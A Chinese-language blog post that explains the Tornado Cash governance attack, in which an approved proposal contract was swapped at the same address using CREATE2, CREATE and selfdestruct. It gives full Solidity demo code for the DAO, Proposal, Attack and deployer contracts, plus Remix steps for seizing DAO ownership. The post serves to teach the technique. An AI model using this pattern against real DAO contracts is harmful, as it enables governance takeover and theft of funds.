# Tornado 治理攻击



大概两周前（5 月 20 日），知名混币协议 Tornado Cash 遭受到治理攻击，黑客获取到了Tornado Cash的治理合约的控制权。

攻击过程是这样的： 攻击者先提交了一个“看起来正常”的提案，待提案通过之后，销毁了提案要执行的合约地址，并在该地址上重新创建了一个攻击合约。

攻击过程可以查看 SharkTeam 的  [Tornado.Cash提案攻击原理分析](https://learnblockchain.cn/article/5844 )。

这里攻击的关键是在**同一个地址上部署了不同的合约**， 这是如何实现的呢？



## 背景知识

EVM 中有两个操作码用来创建合约： `CREATE` 与 `CREATE2` 。



###  `CREATE` 操作码

 当使用 `new Token()` 使用的是  `CREATE` 操作码 ， 创建的合约地址计算函数为：

```solidity
address tokenAddr = bytes20(keccak256(senderAddress, nonce))
```

创建的合约地址是通过**创建者地址** + **创建者Nonce**（创建合约的数量）来确定的， 由于 Nonce 总是逐步递增的， 当 Nonce 增加时，创建的合约地址总是是不同的。



### `CREATE2` 操作码

当添加一个salt时 `new Token{salt: bytes32()}()` ，则使用的是  `CREATE2` 操作码 ， 创建的合约地址计算函数为： 

```solidity
 address tokenAddr = bytes20(keccak256(0xFF, senderAddress, salt, bytecode))
```

创建的合约地址是 **创建者地址** + **自定义的盐** + **要部署的智能合约的字节码**， 因此 只有相同字节码 和 使用相同的盐值，才可以部署到同一个合约地址上。





那么如何才能在同一地址如何部署不用的合约？



## 攻击手段

攻击者结合使用 `Create2` 和 `Create` 来创建合约， 如图：

![image-20230602114327923](https://img.learnblockchain.cn/pics/20230602114337.png)



> 代码参考自： https://solidity-by-example.org/hacks/deploy-different-contracts-same-address/



先用 `Create2` 部署一个合约 `Deployer` ， 在 `Deployer` 使用 Create 创建目标合约 `Proposal`（用于提案使用）。  `Deployer` 和  `Proposal` 合约中均有自毁实现（`selfdestruct`）。

在提案通过后，攻击者把  `Deployer` 和  `Proposal` 合约销毁，然后重新用相同的slat创建 `Deployer`  ，  `Deployer` 字节码不变，slat 也相同，因此会得到一个和之前相同的   `Deployer`  合约地址， 但此时   `Deployer`  合约的状态被清空了， nonce 从 0 开始，因此可以使用该 nonce 创建另一个合约`Attack`。  





## 攻击代码示例

 此代码来自：https://solidity-by-example.org/hacks/deploy-different-contracts-same-address/



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;


contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(Proposal({target: target, approved: true, executed: false}));
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok, ) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}

```

大家可以使用该代码自己在 Remix 中演练一下。



1. 首先部署 `DeployerDeployer` ， 调用 `DeployerDeployer.deploy()` 部署 `Deployer` ， 然后调用   `Deployer.deployProposal()`  部署  `Proposal` 。 
2. 拿到 `Proposal` 提案合约地址后， 向  DAO 发起提案。
3. 分别调用 `Deployer.kill` 和  `Proposal.emergencyStop` 销毁掉 `Deployer` 和 `Proposal`
4. 再次调用 `DeployerDeployer.deploy()` 部署 `Deployer` ， 调用 `Deployer.deployAttack()` 部署  `Attack` ，    `Attack`  将和之前的   `Proposal` 一致。
5. 执行 `DAO.execute` 时，攻击完成 获取到了 DAO 的 Owner 权限。







 



